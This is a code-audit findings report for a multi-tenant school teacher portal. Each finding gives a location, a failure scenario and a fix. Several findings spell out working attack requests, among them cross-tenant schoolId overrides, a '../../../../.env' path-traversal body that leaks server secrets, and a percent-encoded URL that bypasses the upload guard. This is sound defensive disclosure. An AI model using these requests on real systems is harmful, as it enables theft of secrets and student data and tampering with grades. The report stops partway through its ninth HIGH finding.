# Teacher Portal — Production Readiness Findings

Generated from a 15-section code audit with adversarial verification (30 agents).
**188 findings survived verification; 14 were refuted.**

| Severity | Count |
|---|---|
| CRITICAL | 20 |
| HIGH | 54 |
| MEDIUM | 88 |
| LOW | 26 |

Items marked **[FIXED]** were resolved and verified against a running stack during the audit session.

---

## CRITICAL

### 1. [FIXED] Teacher "New Notice" always fails: frontend sends `_authorName`, backend schema is `.strict()`

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/hooks/useNoticeBoard.ts:104`
- **Failure:** Teacher logs in, opens /teacher/notice-board, clicks "New Notice" (enabled as soon as they have one class), picks a class board, types a title and body, clicks Post. POST /api/notice-board returns 400 {"success":false,"message":"Validation failed","errors":"Unrecognized key: \"_authorName\""}. teacher/notice-board/page.tsx:36-38 catches with `toast.error('Failed to create post')` and no detail. No notice is ever created, for any teacher, in any school.
- **Fix:** Delete the `_authorName` property from the POST body in createPost (src/hooks/useNoticeBoard.ts:102-106) so only the schema fields are sent. Server-side, replace `(req.body._authorName as string) ?? userName` in campusly-backend/src/modules/NoticeBoard/controller.ts:14 with a name resolved from the authenticated User document (firstName/lastName, falling back to req.user.email) — the current read is both dead after validation and a display-name spoofing vector.

### 2. Teacher conferences page can never load events: `schoolId` query param rejected by `.strict()` schema

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/app/(dashboard)/teacher/conferences/page.tsx:33`
- **Failure:** Admin publishes a parent-teacher conference event. A teacher opens /teacher/conferences. GET /api/conferences/events?schoolId=<id>&status=published returns 400 "Unrecognized key: schoolId". The page shows "No conferences — No upcoming conferences to display." permanently, so the teacher can never reach Set Availability or View Schedule and no parent can ever book a slot with them.
- **Fix:** In src/app/(dashboard)/teacher/conferences/page.tsx:33 call `fetchEvents({ status: 'published' })` — the backend already scopes to `req.user.schoolId` in ConferenceController.listEvents. Additionally, add an `eventsError` flag to useConferences.fetchEvents (src/hooks/useConferences.ts:44-57) and render a distinct error state on the page so a 4xx never masquerades as an empty board.

### 3. Bulk "Message Parents" recipient list is always empty — response shape mismatch (`{parents:[...]}` vs `extractArray` reading `.data`)

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/hooks/useCommunicationLookups.ts:116`
- **Failure:** Teacher opens /teacher/communication and clicks "Message Parents". ParentRecipientPicker renders only the disabled item "No parent recipients available" (ParentRecipientPicker.tsx:41-45), and page.tsx:249-251 shows the permanent "At least one recipient is required" hint. Pressing Send trips `toast.error('Please select at least one recipient')` (page.tsx:70-73). There is no other recipient control on the page, so bulk parent messaging — the page's entire purpose — cannot be used by any teacher.
- **Fix:** In src/hooks/useCommunicationLookups.ts:116-118 replace `unwrapResponse(res)` + `extractArray(raw)` with `unwrapList<Record<string, unknown>>(res, 'parents')` from src/lib/api-helpers.ts (its generic key scan already handles this envelope), keeping the separate `unwrapResponse` read for `totalPages`. Optionally add a `parents` branch to extractArray in src/components/communication/mappers.ts so other callers cannot repeat the mistake.

### 4. [FIXED] Teacher onboarding "Add students" step 400s for every student, then toasts success

- **Section:** n/a
- **Location:** `src/hooks/useTeacherOnboarding.ts:69`
- **Failure:** A standalone teacher signs up, is taken to /teacher/onboarding, completes step 1 (school) and step 2 (grades/subjects/classes), then on step 3 types five learners (or pastes CSV) and presses "Done — Add 5 Students". Each POST /api/students returns 400 with `Validation failed / deliveryMethod`. bulkCreateStudents logs five console errors, returns 0, and the page shows the green toast "0 student(s) added successfully" before routing to /teacher. No learner rows exist, the typed names are discarded, and the Getting-started card still shows "Invite a student" unticked with no explanation.
- **Fix:** In src/hooks/useTeacherOnboarding.ts createStudent (line 69), add `deliveryMethod: 'slip'` to the POST body — onboarding generates synthetic @students.campusly.local addresses, so the 'email' branch of the superRefine would be meaningless. Then change bulkCreateStudents to return `{ created, failed }` and have submitStudents in src/app/(dashboard)/teacher/onboarding/page.tsx:116-134 call toast.error when failed > 0 instead of an unconditional success toast.

### 5. [FIXED] PUT /api/schools/:id has no tenant ownership check — any standalone teacher can modify any school

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/School/routes.ts:48`
- **Failure:** Anyone self-registers as a standalone teacher (free signup sets isStandaloneTeacher=true). They open devtools on /teacher/onboarding step 1, watch the legitimate PUT /api/schools/<theirOwnId> their own onboarding fires, then replay it with another tenant's ObjectId: PUT /api/schools/<victimSchoolId> with body {"modulesEnabled":[],"isActive":false}. It returns 200 and the victim school is deactivated with every module stripped; their staff and parents are locked out of nav-gated features. The same request with {"name":"…"} renames any school on the platform.
- **Fix:** In campusly-backend/src/modules/School/controller.ts, add the same guard update() is missing that getById already has at lines 27-38: before calling SchoolService.update / updateSettings, throw ForbiddenError unless `req.user?.role === 'super_admin' || String(req.user?.schoolId) === req.params.id`. Belt-and-braces: change SchoolService.update/updateSettings in service.ts to take a callerSchoolId and fold it into the findOneAndUpdate filter.

### 6. [FIXED] Academic grade/subject endpoints trust client-supplied schoolId (write) and ?schoolId (read)

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Academic/controllers/grade.controller.ts:9`
- **Failure:** A standalone teacher completes onboarding (which already teaches their browser the exact shape of POST /api/academic/grades with an explicit schoolId in the body — useTeacherOnboarding.ts:47). They resend it with schoolId set to another tenant's id and inject 'Grade 1'…'Grade 12' rows into that school's academic setup, where they surface in every grade dropdown for that school's admins and teachers. Reading is even easier: GET /api/academic/grades?schoolId=<otherSchoolId> and GET /api/academic/subjects?schoolId=<otherSchoolId> return the other tenant's full grade and subject lists to a caller from a different school.
- **Fix:** In campusly-backend/src/modules/Academic/controllers/grade.controller.ts:9 and subject.controller.ts:9, build the payload as `const data = { ...req.body, schoolId: user.role === 'super_admin' ? (req.body.schoolId ?? user.schoolId) : user.schoolId }` before calling the service (mirroring class.controller.ts:25-31). In listGrades (grade.controller.ts:21) and listSubjects (subject.controller.ts:22), only honour `req.query.schoolId` when `user.role === 'super_admin'`; otherwise force `user.schoolId`.

### 7. [FIXED] Every TeacherWorkbench controller takes schoolId from the client query string, letting any teacher read another school's data

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/controllers/aggregation.controller.ts:23`
- **Failure:** A teacher logs into School A normally and gets a valid JWT. With that token they call GET /api/teacher-workbench/student-360/<schoolB_studentId>?schoolId=<schoolB_id>. requireModule passes (it reads req.user.schoolId = School A), then getStudent360 queries Mark/Attendance/Discipline/Merit with schoolId = School B and returns another school's pupil's mark history, attendance breakdown, disciplinary incidents and merits. The same token against DELETE /api/teacher-workbench/curriculum/topics/<schoolB_topicId>?schoolId=<schoolB_id> soft-deletes School B's topic and cascades to its children (curriculum.service.ts:113-117).
- **Fix:** In campusly-backend/src/modules/TeacherWorkbench/controllers/aggregation.controller.ts and curriculum.controller.ts, replace every `String(req.query.schoolId ?? user.schoolId ?? '')` with `user.schoolId` and throw ForbiddenError when it is absent — matching what createFramework already does at curriculum.controller.ts:16. Alternatively add `schoolContext` to the mount in app.ts:189 and read `req.schoolId`, which already restricts the query override to super_admin.

### 8. [FIXED] CSV bulk student import fails 100% of the time — every row is rejected by backend validation

- **Section:** n/a
- **Location:** `src/components/classes/StudentAddDialog.tsx:178`
- **Failure:** Teacher opens /teacher/classes/<id>/roster → Add Learners → 'CSV - bulk minimal' tab → pastes `John,Doe` and `Jane,Smith,ADM002` → Import. Each row POSTs /api/students with deliveryMethod:'email' and no email, so each returns 400. Toast reads 'All students failed to import', the dialog closes, the pasted text is cleared, zero learners are created, and the teacher is never shown a reason. Identical on the Add Learners dialog launched from the classes list page.
- **Fix:** In StudentAddDialog.tsx:178 send `deliveryMethod: 'slip'` for CSV rows (Student/service.ts already mints a synthetic @students.campusly.local login for slip mode), or add an optional 4th email column and choose per row (`email ? 'email' : 'slip'`). Also change StudentCsvImportTab.tsx:57-59 to list `progress.errors` strings, and stop calling `resetForm()`/`onOpenChange(false)` in the all-failed branch (StudentAddDialog.tsx:194-198) so the teacher keeps their input.

### 9. Counselor dashboard can never progress a referral — Acknowledge action is not wired

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/pastoral/page.tsx:170`
- **Failure:** A teacher submits a referral via /teacher/referral (status 'referred'). The counselor opens /teacher/pastoral → Referrals tab → clicks View on that row. ReferralDetailDrawer renders the student, reason, urgency and timeline but no Actions section at all — Acknowledge is suppressed because `onAcknowledge` is undefined and Mark Resolved is suppressed because status is not acknowledged/in_progress. No other screen in the app issues PUT /pastoral/referrals/:id. The referral is frozen: it can never be acknowledged, self-assigned, or resolved. As a consequence the counselor's Dashboard 'cases' list and Students tab stay empty forever, and every StudentCaseRow → /teacher/pastoral/students/<id> wellbeing link is unreachable.
- **Fix:** In src/app/(dashboard)/teacher/pastoral/page.tsx, pass the already-implemented mutation into the drawer: `onAcknowledge={async (id) => { await updateReferral(id, { status: 'acknowledged' }); await Promise.all([fetchReferrals(), fetchCaseload()]); }}`. The backend already self-assigns the counselor on that transition (service-referrals.ts:131-135), so no extra assignedCounselorId payload is needed.

### 10. Teacher leave is completely non-functional — every leave call sends `schoolId` into a `.strict()` Zod schema and gets 400

- **Section:** n/a
- **Location:** `src/hooks/useLeave.ts:53`
- **Failure:** A teacher navigates to /teacher/leave. (1) The default 'My Leave' tab fires GET /api/leave/requests?staffId=<id>&schoolId=<id> → 400 Validation failed; useLeave.ts:64-66 swallows it into `setRequests([])`, so a teacher with approved leave on record sees the empty state 'You haven't submitted any leave requests yet.' (2) Clicking 'Apply for Leave', filling the form and submitting fires POST /api/leave/requests with schoolId in the body → 400; page.tsx:82 shows 'Failed to submit leave request'. No teacher in the system can ever apply for leave. (3) The Calendar tab fires GET /api/leave/calendar?schoolId=... → 400, so the month grid renders with zero entries.
- **Fix:** In src/hooks/useLeave.ts, drop schoolId from the four validated calls — the controller already derives it from `getUser(req).schoolId`. Change line 53 to `{ params }`, line 120-125 to `{ params: { startDate, endDate } }`, line 139-141 to `{ params }`, and change `createRequest`'s payload type to omit `schoolId` (also removing `schoolId` from the spread at teacher/leave/page.tsx:77). Alternatively add `schoolId: objectIdSchema.optional()` to createLeaveRequestSchema, listLeaveRequestsSchema, leaveCalendarQuerySchema and substituteQuerySchema in campusly-backend/src/modules/Leave/validation.ts.

### 11. [FIXED] Cross-tenant merit/demerit write: POST /attendance/merits takes schoolId from the request body instead of the JWT

- **Section:** n/a
- **Location:** `src/modules/Attendance/controller.ts:283`
- **Failure:** A teacher at School A awards a demerit at /teacher/merits, copies the POST /api/attendance/merits payload from devtools, and replays it with `schoolId` and `studentId` swapped for a School B learner (ObjectIds are exposed in shared report URLs and populated payloads). Student.findOne succeeds because it is scoped by the attacker's own schoolId value, and a demerit is permanently written into School B's Merit collection — visible on School B's /teacher/merits list and counted in that learner's merit balance. Separately, because MeritService.createMerit never calls assertCanAccessStudent, a teacher can award or deduct behaviour points for any learner in their own school, including learners they do not teach — an authorization gap that DisciplineService closes.
- **Fix:** Remove `schoolId: objectIdSchema` from `createMeritSchema` in campusly-backend/src/modules/Attendance/validation.ts:109, and change controller.ts:283 to `MeritService.createMerit({ ...req.body, schoolId: getUser(req).schoolId }, getUser(req).id)`. Then add the `assertCanAccessStudent`/`getTeacherStudentIds` teaching-load check that DisciplineService already uses to MeritService.createMerit.

### 12. [FIXED] GET /api/learning/quizzes lets any authenticated user override schoolId and dumps every quiz's correctAnswer

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Learning/controller.ts:28`
- **Failure:** A teacher on School A logs in normally (standalone signup already enables the 'learning' module — Auth/standalone.service.ts:50-59), opens devtools and re-issues the request the app already makes from useTeacherQuizzes.ts:39 with one extra param: GET /api/learning/quizzes?schoolId=<School B ObjectId>&limit=100. The response is School B's quizzes in full, including every questions[].correctAnswer and questions[].explanation. Because routes.ts:35 has no authorize(), a student account can issue the identical request against its own school and read the answer key for an unpublished quiz before sitting it.
- **Fix:** In campusly-backend/src/modules/Learning/controller.ts, change listQuizzes (line 28), getStudyMaterials (line 107) and listRubrics (line 165) to `schoolId: req.user!.schoolId!` and drop the req.query.schoolId fallback entirely (add an explicit `req.user.role === 'super_admin'` branch if cross-school listing is ever needed). Separately, add `authorize('teacher','school_admin','super_admin')` to routes.ts:35 GET /quizzes, or project away `questions.correctAnswer`/`questions.explanation` in quiz.service.ts listQuizzes so the answer key never leaves the server on a list call.

### 13. [FIXED] No schoolId scope check on PUT /api/schools/:id and PATCH /api/schools/:id/settings

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/School/routes.ts:48`
- **Failure:** A standalone teacher (the launch cohort) signs in, obtains any other school's ObjectId, and sends PUT /api/schools/<victimId> with {"isActive": false}. requireCapability('manage_school_settings') passes because isStandaloneTeacher is true; SchoolController.update forwards req.params.id straight to SchoolService.update. The victim school flips inactive, moduleGuard.getSchoolModules then returns [] for it, and every module-guarded route (academic, homework, attendance, fees) 403s for that school's entire staff. The same request can rewrite the victim's name, contactInfo and modulesEnabled.
- **Fix:** In campusly-backend/src/modules/School/routes.ts, add `validateSchoolScope('id')` (already implemented in src/middleware/schoolScope.ts) to both the PUT '/:id' and PATCH '/:id/settings' chains, immediately after authenticate. Alternatively, mirror the pattern SchoolController.getById already uses: compare req.params.id to req.user.schoolId inside update/updateSettings and throw ForbiddenError for non-super_admin callers.

### 14. Excalidraw whiteboard sync has no server: the y-socket.io namespace does not exist in the backend

- **Section:** n/a
- **Location:** `src/hooks/useExcalidrawCollaboration.ts:37`
- **Failure:** Teacher starts a live session, opens /classroom/<sessionId>, clicks the Board tab and draws a diagram. Students on their own devices open the same Board tab and see a permanently blank canvas — no stroke ever crosses the network. The teacher gets no error, because useExcalidrawCollaboration never listens for 'connection-error'. Switching to Chat and back destroys the Y.Doc (base-ui Tabs.Panel keepMounted defaults to false, node_modules/@base-ui/react/tabs/panel/TabsPanel.js:37) so the teacher's own work is also lost on tab flip.
- **Fix:** Either add a y-socket.io server to campusly-backend/src/socket/index.ts (`new YSocketIO(io, {...})` from y-socket.io/dist/server, adding yjs + y-socket.io to package.json), authenticate it with the same JWT check as socket/auth.ts, and authorise the `whiteboard-<sessionId>` room via SessionService.assertCanAccessSession before letting a client join — or drop the SocketIOProvider from src/hooks/useExcalidrawCollaboration.ts and ship SharedWhiteboard.tsx as explicitly local-only. Pass `auth: { token }` in the SocketIOProvider config when the server lands; today the room id is guessable and no credential is sent.

### 15. Live classroom page crashes when the teacher opens the People tab — ParticipantGrid uses LiveKit hooks outside LiveKitRoom

- **Section:** n/a
- **Location:** `src/app/(dashboard)/classroom/[sessionId]/page.tsx:193`
- **Failure:** Teacher is mid-lesson at /classroom/<sessionId> with video connected, clicks the 'People' tab in the right sidebar to check who has joined. useParticipants() throws 'No room provided...' during render, React unwinds the whole page, and with no error.tsx under src/app/(dashboard) Next.js escalates to the global error screen. LiveKitRoom unmounts, the teacher's mic/camera drop and every student sees them leave; the teacher must navigate back and rejoin. 100% reproducible for every host on every session.
- **Fix:** Move the sidebar Tabs into the LiveKitRoom subtree (pass it as `children` of `<VideoRoom>` in src/app/(dashboard)/classroom/[sessionId]/page.tsx, which already accepts children), or make src/components/classroom/ParticipantGrid.tsx defensive: swap `useParticipants()` for `useMaybeRoomContext()` and return the existing 'No participants yet.' placeholder when the context is undefined. Add src/app/(dashboard)/error.tsx as a safety net so one widget cannot white-screen a live lesson.

### 16. [FIXED] Teacher can write/overwrite marks into ANY school's gradebook — schoolId is taken from the request body

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Academic/services/assessment.service.ts:123`
- **Failure:** Teacher at School A logs into the teacher portal, opens the gradebook, and in devtools issues `GET /api/academic/exams?schoolId=<School B id>` (teacher-authorised, unfiltered — see the ?schoolId finding) to harvest School B ids. They then POST `/api/academic/marks` with `{assessmentId:<School B assessment>, studentId:<School B student>, schoolId:<School B>, mark:0, total:100}`. Because the upsert filter omits schoolId and the unique index is `{assessmentId, studentId}`, School B's existing mark row is overwritten with 0%. `POST /api/academic/marks/bulk-capture` does the same for a whole batch: the assessment is loaded with `findById` (no school filter) and the roster check is skipped entirely when the target assessment has no classId.
- **Fix:** In `src/modules/Academic/controllers/misc.controller.ts`, change `captureMark` to `AcademicService.captureMark({ ...req.body, schoolId: req.user!.schoolId! })` and `bulkCaptureMarks` to take schoolId from `req.user!.schoolId!` instead of `req.body`. Drop `schoolId` from `markSchema`/`bulkMarkSchema` in `src/modules/Academic/validation.ts` (both are `.strict()`, so a client that still sends it will 400). In `services/assessment.service.ts:123`, add `schoolId: data.schoolId` to the upsert filter, change `Assessment.findById(assessmentId)` at :146 to `Assessment.findOne({ _id: assessmentId, schoolId, isDeleted: false })`, and change `model.ts:460` to `markSchema.index({ schoolId: 1, assessmentId: 1, studentId: 1 }, { unique: true })`.

### 17. [FIXED] Any teacher can read another school's grades/exams/past-papers/weightings by appending ?schoolId=<other school>

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Academic/controllers/grade.controller.ts:21`
- **Failure:** A teacher signs into the School A teacher portal, opens devtools on any dashboard page, and issues `GET /api/academic/remedials?schoolId=<School B ObjectId>` with their own valid token. There is no comparison against req.user.schoolId anywhere in the chain, so School B's remedial-intervention records — student ids, identified learning difficulties, intervention notes — come back in full. The same one-parameter change works on /academic/grades, /academic/exams, /academic/past-papers and /academic/subject-weightings, and the exam ids it returns are the precondition for the mark-overwrite and exam-timetable-mutation findings.
- **Fix:** In `src/modules/Academic/controllers/grade.controller.ts:21` and `misc.controller.ts` lines 226, 297, 350, 381, replace `(req.query.schoolId as string) ?? user.schoolId` with `req.user!.schoolId!`. If super_admin needs a cross-school view, wire the existing `schoolContext` middleware (src/middleware/schoolContext.ts — it already restricts the query override to super_admin) into `app.ts:159`: `app.use('/api/academic', authenticate, requireModule('academic'), schoolContext, academicRoutes)` and read `req.schoolId` in the controllers.

### 18. [FIXED] Bulk mark capture trusts a client-supplied schoolId and looks up the assessment unscoped — cross-tenant mark write/overwrite

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Academic/controllers/misc.controller.ts:144`
- **Failure:** Any authenticated teacher at School A (their own valid token; the route accepts role 'teacher') sends POST /api/academic/marks/bulk-capture with body { assessmentId: '<School B assessment _id>', schoolId: '<School B _id>', marks: [{ studentId: '<School B student _id>', mark: 0, total: 100 }] }. Assessment.findById resolves School B's assessment because the lookup has no tenant filter; the roster check queries Student.find({ classId: <School B class>, schoolId: <School B> }) and passes because the schoolId came from the body; the bulkWrite upserts over School B's existing Mark documents. School B's captured marks are silently replaced with zeros and re-stamped with the supplied schoolId. The same request also succeeds against soft-deleted assessments because isDeleted is never filtered.
- **Fix:** In MiscController.bulkCaptureMarks (misc.controller.ts:144) read `const schoolId = req.user!.schoolId!;` and drop `schoolId` from bulkMarkSchema in campusly-backend/src/modules/Academic/validation.ts:117-128 (the schema is .strict(), so removing the key makes a supplied schoolId a 400). In AssessmentService.bulkCaptureMarks (assessment.service.ts:146) change the lookup to `Assessment.findOne({ _id: assessmentId, schoolId, isDeleted: false })`, and add `schoolId` to the updateOne filter at :163-168 so a foreign Mark can never be matched. For classId-less assessments, resolve membership via the linked assignment/paper instead of skipping the check.

### 19. [FIXED] Batch-confirm accepts arbitrary imageFilenames — authenticated teacher can copy any server file into a marking and download it

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/AITools/service-marking-batch-confirm.ts:55`
- **Failure:** A teacher opens Mark Papers → Whole class, uploads one photo for any class to create a batch, and waits for status 'reviewing'. Instead of clicking Confirm, they POST /api/ai-tools/batches/<batchId>/confirm with body {"assignments":[{"imageFilenames":["../../../../.env"],"studentId":"<any 24-hex id>","studentName":"x"}]}. copyFileSync reads the repo .env, finaliseImages renames it to page-1.jpg under uploads/markings/<newMarkingId>/, and the PaperMarking doc is saved with images[0].filename='page-1.jpg'. The teacher then calls GET /api/ai-tools/markings?limit=100 to read back the new markingId (school-wide list, no teacher filter) and GET /api/ai-tools/markings/<markingId>/image/page-1.jpg, which streams the raw .env bytes. Any file readable by the node process — API keys, JWT secret, Mongo URI, other schools' uploaded student scans — is exfiltrable by one ordinary teacher account.
- **Fix:** In confirmBatch (service-marking-batch-confirm.ts), before the copy loop, build `const allowed = new Set(batch.pageExtracts.map(p => p.filename))` and throw BadRequestError for any `fname` not in it; additionally tighten controller-marking-batch.ts:28 to `z.array(z.string().regex(/^page-\d+\.(jpg|jpeg|png|webp)$/)).min(1)` and assert `path.resolve(srcPath).startsWith(path.resolve(dir) + path.sep)` as defence in depth.

### 20. [FIXED] /uploads guard for marking images is bypassable — student answer scans are served publicly with no authentication

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/app.ts:235`
- **Failure:** A teacher marks a class; each student's photographed answer sheet is archived at uploads/markings/<markingId>/page-N.jpg. Anyone on the internet — no login, no cookie, no token — requests GET https://<api-host>/uploads/%6Darkings/<markingId>/page-1.jpg and receives the photograph of the child's handwritten paper (name and admission number visible in the header the AI just extracted). Marking IDs leak through any shared link, browser history, or log, and the same bypass works for /uploads/%6Darkings-batch/<batchId>/page-1.jpg, which holds every page of the whole class. The AuthenticatedImage component and the getMarkingImage gate the module was designed around are completely sidestepped.
- **Fix:** Move the archives out of the statically served root — change markingDir/batchDir in campusly-backend/src/modules/AITools/service-marking-images.ts:82-88 to `path.join(process.cwd(), 'private-uploads', 'markings'|'markings-batch', id)` so express.static('uploads') can never reach them. If the directory must stay put, replace the prefix test in app.ts:235 with a decoded, normalised, lower-cased check: `let p; try { p = decodeURIComponent(req.path) } catch { return res.sendStatus(400) } p = p.toLowerCase().replace(/\\/g,'/'); if (p.startsWith('/markings/') || p.startsWith('/markings-batch/')) return res.sendStatus(404);`


---

## HIGH

### 1. No teacher UI exists to grade or override a homework submission — the grading component is dead code

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/homework/HomeworkSubmissionsTable.tsx:61`
- **Failure:** Teacher opens /teacher/homework/<id>, sees the Submissions card, expands a row where the AI awarded 0/5 on a free-text answer that was actually correct (the 'AI rationale' details block shows the misread). The only control available is the circular-arrow button, which calls POST /homework/submissions/:id/regrade and re-runs the same AI. There is no mark field, no feedback field, and no save action anywhere in the teacher portal, so the wrong mark is permanent — and since gradebookAutoPublish defaults to true, that wrong mark is already in the gradebook via publishHomeworkGrade at service-homework-grading-runner.ts:264.
- **Fix:** Render GradingInterface inside HomeworkSubmissionsTable.tsx's expanded row (next to SubmissionDetails), passing maxMarks from the row's `s.maxMarks` and an onGradeSubmission that calls useTeacherHomeworkDetail's gradeSubmission + handleGraded — which means lifting those through props from teacher/homework/[id]/page.tsx, or moving the grade mutation into useTeacherHomeworkSubmissions so the table owns a single submissions source instead of the two parallel fetches of /homework/:id/submissions that both hooks currently issue.

### 2. 'Save (don't publish)' publishes assignment marks to the gradebook anyway (gradebookAutoPublish defaults to true)

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Assignment/service.ts:711`
- **Failure:** Teacher creates an assignment at /teacher/assignments/new and leaves the 'Auto-publish marks to gradebook' checkbox ticked (its default). Later, on the assignment detail Submissions tab, they click 'Mark' on a student, enter rubric marks, and deliberately click 'Save (don't publish)' to hold the mark back pending HOD moderation. Because input.publish=false is OR-ed with gradebookAutoPublish=true, publishAssignmentGrade upserts the Mark row, submission.status flips to 'published', and the mark is immediately live to student and parent. The submissions list then renders the green 'Published' badge — the only signal, and one the teacher has no reason to look for after clicking a button that promised not to publish.
- **Fix:** In campusly-backend/src/modules/Assignment/service.ts:711 make an explicit false an opt-out: `const shouldPublish = input.publish === true || (input.publish === undefined && assignment.gradebookAutoPublish);` (markSubmissionSchema must keep publish optional rather than defaulting it). Then in AssignmentMarkingDialog.tsx relabel the two footer buttons from the assignment's actual gradebookAutoPublish value so the teacher can see which mode they are in.

### 3. Content-library 'Assign as Homework' sets the due date to 02:00 SAST and hard-blocks every same-day submission

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useAssignHomework.ts:43`
- **Failure:** Teacher goes to /teacher/curriculum/content, picks a reading resource, clicks 'Assign as Homework', selects a class and due date 2026-08-05, submits. The stored dueDate is 2026-08-05T00:00:00.000Z = 02:00 on 5 Aug in South Africa, and latePolicy silently defaults to 'block'. Every student who opens the homework during school hours on 5 August gets 'Late submissions not accepted' from service-homework-submit.ts:87 and cannot hand in at all. The teacher's submissions list stays empty with no explanation, and nothing in the UI ever showed them a late policy they never chose.
- **Fix:** In campusly-frontend/src/hooks/useAssignHomework.ts build the date from local parts and push it to end of day: `const [y, m, d] = formData.dueDate.split('-').map(Number); const due = new Date(y, m - 1, d, 23, 59, 0);` then send `due.toISOString()`. Also add latePolicy / latePenaltyPercent controls to AssignHomeworkDialog.tsx (mirroring the three-button late-policy block in HomeworkWizardStep1.tsx) so 'block' is a choice rather than a silent default.

### 4. Direct-message recipient dropdown is always empty — hook reads `parentIds`, backend returns `guardianIds`

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/hooks/useRecipientLookup.ts:31`
- **Failure:** Teacher opens /teacher/messages, clicks "New", selects a learner from the Student dropdown. The Parent dropdown becomes enabled but renders no options at all, so no recipient can be chosen and the Send button stays permanently disabled. The teacher cannot start any new conversation with a parent, even though POST /api/messaging/threads works.
- **Fix:** In the teacher branch of src/hooks/useRecipientLookup.ts:31 read `raw.guardianIds ?? raw.parentIds ?? raw.parents ?? []`. The populated entries are Parent docs whose `userId` is itself populated with firstName/lastName, which the existing object branch at lines 36-44 already maps correctly.

### 5. New-message student dropdown renders blank labels — Student has no top-level firstName/lastName

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/messaging/NewThreadDialog.tsx:96`
- **Failure:** Teacher clicks "New" on /teacher/messages and opens the Student select. Every row is blank (one space) — no name, no admission number. With 30 learners the teacher has no way to know which row is which, and picking the wrong row silently addresses the thread to a different child's guardian.
- **Fix:** In src/components/messaging/NewThreadDialog.tsx:95-99 resolve the name off the populated user before rendering: `const u = s.user ?? (s.userId as unknown as { firstName?: string; lastName?: string }); const label = `${u?.firstName ?? s.firstName ?? ''} ${u?.lastName ?? s.lastName ?? ''}`.trim() || s.admissionNumber;`. Better: extract a `getStudentName(student)` helper into src/lib and reuse it here and in src/app/(dashboard)/admin/students/page.tsx:19-25.

### 6. joinSchool never clears isStandaloneTeacher — joined teacher keeps school-admin capabilities in the new school

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Auth/service.ts:429`
- **Failure:** A teacher at a real school (who started standalone) opens /teacher/settings/join-school, enters the school's 6-character code and confirms. They land on /teacher. Their JWT still carries isStandaloneTeacher=true but schoolId is now the real school, so they can PUT /api/schools/<realSchoolId> (manage_school_settings) to rename it or disable modules, and POST/DELETE /api/academic/grades and /subjects for the whole school (manage_academic_setup) — capabilities a rank-and-file teacher is never meant to have. Meanwhile the sidebar briefly shows the full TEACHER_NAV because useJoinSchool dropped the flag from the store, then on the next reload /auth/me restores it and layout.tsx:137 locks them back into the standalone allowlist.
- **Fix:** In campusly-backend/src/modules/Auth/service.ts joinSchool, add `teacher.isStandaloneTeacher = false;` alongside the existing `teacher.isSchoolPrincipal = false;` at line 430 before `await teacher.save()`. In campusly-frontend/src/hooks/useJoinSchool.ts:32-44, stop hand-building the User object — call the existing session-hydration path (GET /auth/me) after storeLogin, or copy isStandaloneTeacher/isSchoolPrincipal/isHOD off userData so the store and the token agree.

### 7. Join-school promises lesson/homework migration but only migrates 5 models — teacher's lessons, homework, classes and learners are orphaned on the archived school

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Auth/service.ts:405`
- **Failure:** A standalone teacher with 30 lessons, 12 homework tasks, 3 teaching groups and 60 learners reads the amber panel on /teacher/settings/join-school promising their lessons will be migrated, ticks "I understand", and joins their school. After the redirect to /teacher the dashboard's Today/Grading/Drafts zones are empty because /lessons and /homework now filter on the new schoolId; /teacher/lessons, /teacher/homework and /teacher/classes are all empty. The old school is isActive:false so it cannot be rejoined by code, and there is no un-join action anywhere in the UI.
- **Fix:** In campusly-backend/src/modules/Auth/service.ts:405-411, extend contentModels to include 'Lesson', 'Homework', 'Class' and any other model exposing both schoolId and teacherId (the guard at 416-419 already filters safely), and handle Student/Grade/Subject explicitly since they key off schoolId only. Wrap the archive+migrate+relink sequence in a mongoose session/transaction so a partial failure cannot leave the teacher pointing at a deactivated school. Until Lesson/Homework are actually migrated, correct the copy at src/app/(dashboard)/teacher/settings/join-school/page.tsx:114 to name only what moves.

### 8. Teacher home dashboard only sees the first 20 homework and 20 lessons — Today/Grading/Drafts counts are wrong

- **Section:** n/a
- **Location:** `src/hooks/useTeacherDashboard.ts:54`
- **Failure:** A teacher who has created 40 homework tasks this term opens /teacher in the morning. The backend returns only the 20 most recent (default sort -createdAt); the task actually due today was created six weeks ago, so it is on page 2 and never reaches the client. The Today zone renders without it and the badge says 0, the Grading zone never inspects its submissions, and the teacher reads the page as "nothing due" and misses the deadline. The same truncation hides lesson drafts and today's scheduled lessons once the teacher passes 20 lessons.
- **Fix:** In src/hooks/useTeacherDashboard.ts:54-58, pass server-side filters instead of fetching page 1 blind: `apiClient.get('/homework', { params: { teacherId: 'me', limit: 100 } })` and `apiClient.get('/lessons', { params: { teacherId: 'me', dateFrom, dateTo, limit: 100 } })` plus a second lessons call with `published: false` for the Drafts zone (Lesson/validation.ts:180-189 already accepts teacherId/dateFrom/dateTo/published). Longer term add a dedicated aggregate endpoint so the three counts are computed server-side rather than inferred from a page.

### 9. Workbench Question Bank page never calls its fetch — it renders the empty state forever

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/teacher/workbench/question-bank/page.tsx:20`
